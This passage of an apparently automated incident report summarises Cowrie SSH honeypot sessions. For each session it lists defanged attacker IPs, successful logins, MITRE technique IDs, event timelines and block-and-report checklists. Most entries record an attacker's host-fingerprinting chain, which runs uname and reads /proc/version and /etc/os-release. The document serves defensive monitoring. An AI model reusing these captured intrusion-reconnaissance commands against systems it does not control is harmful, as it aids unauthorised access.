| **Last Seen** | 2026-07-06 11:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:56:16` | `cowrie.session.connect` |
| `2026-07-06 11:56:16` | `cowrie.client.version` |
| `2026-07-06 11:56:16` | `cowrie.client.kex` |
| `2026-07-06 11:56:19` | `cowrie.login.success` |
| `2026-07-06 11:56:21` | `cowrie.session.params` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.success` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.command.input` |
| `2026-07-06 11:56:21` | `cowrie.log.closed` |
| `2026-07-06 11:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7d7fa47f83

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 11:56 |
| **Last Seen** | 2026-07-06 11:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:56:45` | `cowrie.session.connect` |
| `2026-07-06 11:56:47` | `cowrie.client.version` |
| `2026-07-06 11:56:47` | `cowrie.client.kex` |
| `2026-07-06 11:56:52` | `cowrie.login.success` |
| `2026-07-06 11:56:57` | `cowrie.session.params` |
| `2026-07-06 11:56:57` | `cowrie.command.input` |
| `2026-07-06 11:56:58` | `cowrie.log.closed` |
| `2026-07-06 11:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d6026c9080

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:57 |
| **Last Seen** | 2026-07-06 11:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:57:47` | `cowrie.session.connect` |
| `2026-07-06 11:57:49` | `cowrie.client.version` |
| `2026-07-06 11:57:49` | `cowrie.client.kex` |
| `2026-07-06 11:57:59` | `cowrie.login.success` |
| `2026-07-06 11:58:03` | `cowrie.session.params` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.success` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:03` | `cowrie.command.input` |
| `2026-07-06 11:58:05` | `cowrie.log.closed` |
| `2026-07-06 11:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e419d5ea2634

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 11:57 |
| **Last Seen** | 2026-07-06 11:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:57:50` | `cowrie.session.connect` |
| `2026-07-06 11:57:50` | `cowrie.client.version` |
| `2026-07-06 11:57:50` | `cowrie.client.kex` |
| `2026-07-06 11:57:52` | `cowrie.login.success` |
| `2026-07-06 11:57:54` | `cowrie.session.params` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.success` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.command.input` |
| `2026-07-06 11:57:54` | `cowrie.log.closed` |
| `2026-07-06 11:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda43e2c0e6c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 11:59 |
| **Last Seen** | 2026-07-06 11:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:59:25` | `cowrie.session.connect` |
| `2026-07-06 11:59:26` | `cowrie.client.version` |
| `2026-07-06 11:59:26` | `cowrie.client.kex` |
| `2026-07-06 11:59:28` | `cowrie.login.success` |
| `2026-07-06 11:59:29` | `cowrie.session.params` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.success` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:29` | `cowrie.command.input` |
| `2026-07-06 11:59:30` | `cowrie.log.closed` |
| `2026-07-06 11:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fbfb4c7438e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:59 |
| **Last Seen** | 2026-07-06 12:00 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:59:49` | `cowrie.session.connect` |
| `2026-07-06 11:59:51` | `cowrie.client.version` |
| `2026-07-06 11:59:51` | `cowrie.client.kex` |
| `2026-07-06 11:59:59` | `cowrie.login.success` |
| `2026-07-06 12:00:04` | `cowrie.session.params` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.success` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:04` | `cowrie.command.input` |
| `2026-07-06 12:00:06` | `cowrie.log.closed` |
| `2026-07-06 12:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1b4267c2f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:01 |
| **Last Seen** | 2026-07-06 12:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:01:01` | `cowrie.session.connect` |
| `2026-07-06 12:01:01` | `cowrie.client.version` |
| `2026-07-06 12:01:01` | `cowrie.client.kex` |
| `2026-07-06 12:01:04` | `cowrie.login.success` |
| `2026-07-06 12:01:05` | `cowrie.session.params` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.success` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.command.input` |
| `2026-07-06 12:01:05` | `cowrie.log.closed` |
| `2026-07-06 12:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ff2b78bb42

| Field | Detail |
|---|---|
| **Source IP** | `188.64.139[.]147` |
| **First Seen** | 2026-07-06 12:01 |
| **Last Seen** | 2026-07-06 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'empty_test'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:01:26` | `cowrie.session.connect` |
| `2026-07-06 12:01:26` | `cowrie.client.version` |
| `2026-07-06 12:01:27` | `cowrie.client.kex` |
| `2026-07-06 12:01:27` | `cowrie.login.success` |
| `2026-07-06 12:01:28` | `cowrie.session.params` |
| `2026-07-06 12:01:28` | `cowrie.command.input` |
| `2026-07-06 12:01:28` | `cowrie.log.closed` |
| `2026-07-06 12:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.64.139[.]147` to AbuseIPDB if not already reported
- [ ] Block `188.64.139[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d7dfa6e0cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:01 |
| **Last Seen** | 2026-07-06 12:02 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:01:50` | `cowrie.session.connect` |
| `2026-07-06 12:01:52` | `cowrie.client.version` |
| `2026-07-06 12:01:52` | `cowrie.client.kex` |
| `2026-07-06 12:02:00` | `cowrie.login.success` |
| `2026-07-06 12:02:05` | `cowrie.session.params` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.success` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:05` | `cowrie.command.input` |
| `2026-07-06 12:02:07` | `cowrie.log.closed` |
| `2026-07-06 12:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e272752c83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:02 |
| **Last Seen** | 2026-07-06 12:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:02:35` | `cowrie.session.connect` |
| `2026-07-06 12:02:36` | `cowrie.client.version` |
| `2026-07-06 12:02:36` | `cowrie.client.kex` |
| `2026-07-06 12:02:38` | `cowrie.login.success` |
| `2026-07-06 12:02:40` | `cowrie.session.params` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.success` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.command.input` |
| `2026-07-06 12:02:40` | `cowrie.log.closed` |
| `2026-07-06 12:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d5a07abd10

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:03 |
| **Last Seen** | 2026-07-06 12:04 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:03:43` | `cowrie.session.connect` |
| `2026-07-06 12:03:44` | `cowrie.client.version` |
| `2026-07-06 12:03:44` | `cowrie.client.kex` |
| `2026-07-06 12:03:55` | `cowrie.login.success` |
| `2026-07-06 12:04:00` | `cowrie.session.params` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.success` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:00` | `cowrie.command.input` |
| `2026-07-06 12:04:02` | `cowrie.log.closed` |
| `2026-07-06 12:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-876c74c83067

| Field | Detail |
|---|---|
| **Source IP** | `154.90.70[.]254` |
| **First Seen** | 2026-07-06 12:04 |
| **Last Seen** | 2026-07-06 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:04:37` | `cowrie.session.connect` |
| `2026-07-06 12:04:37` | `cowrie.client.version` |
| `2026-07-06 12:04:37` | `cowrie.client.kex` |
| `2026-07-06 12:04:37` | `cowrie.login.success` |
| `2026-07-06 12:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.90.70[.]254` to AbuseIPDB if not already reported
- [ ] Block `154.90.70[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a75c73b157

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:05 |
| **Last Seen** | 2026-07-06 12:06 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:05:35` | `cowrie.session.connect` |
| `2026-07-06 12:05:37` | `cowrie.client.version` |
| `2026-07-06 12:05:38` | `cowrie.client.kex` |
| `2026-07-06 12:05:49` | `cowrie.login.success` |
| `2026-07-06 12:05:55` | `cowrie.session.params` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.success` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:55` | `cowrie.command.input` |
| `2026-07-06 12:05:58` | `cowrie.log.closed` |
| `2026-07-06 12:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a33aa9d1fa83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:05 |
| **Last Seen** | 2026-07-06 12:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:05:42` | `cowrie.session.connect` |
| `2026-07-06 12:05:42` | `cowrie.client.version` |
| `2026-07-06 12:05:42` | `cowrie.client.kex` |
| `2026-07-06 12:05:44` | `cowrie.login.success` |
| `2026-07-06 12:05:45` | `cowrie.session.params` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.success` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
| `2026-07-06 12:05:45` | `cowrie.command.input` |
